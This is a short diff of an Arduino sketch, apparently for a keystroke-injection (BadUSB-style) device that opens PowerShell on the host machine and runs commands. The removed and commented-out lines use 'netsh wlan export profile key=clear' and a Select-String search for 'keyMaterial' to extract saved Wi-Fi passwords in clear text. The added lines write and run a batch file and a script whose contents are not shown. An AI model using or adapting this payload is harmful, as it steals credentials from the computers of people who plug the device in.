@@ -17,13 +17,22 @@ void loop() {
   // put your main code here, to run repeatedly:
   wifi.ctrKey("r");
   wifi.runCommand("powershell");
-  wifi.runCommand("netsh wlan export profile key=clear");
-  wifi.runCommand("powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > Wi-Fi-Pass");
+  wifi.delBatFile();
+  delay(300);
+  
+  delay(2000);
+
+  wifi.writeBatFile();
+  wifi.runCommand(".\\testfile1.bat");
+//  wifi.runCommand("netsh wlan export profile key=clear");
+//  wifi.runCommand("powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > Wi-Fi-Pass");
+  //wifi.runCommand("del testfile1.bat");
+  wifi.runScript();
   wifi.runCommand("echo Wi-Fi-Pass");
   delay(3000);
   wifi.runCommand("exit");
   
-  //exit(0);
+  exit(0);
       
 
 }
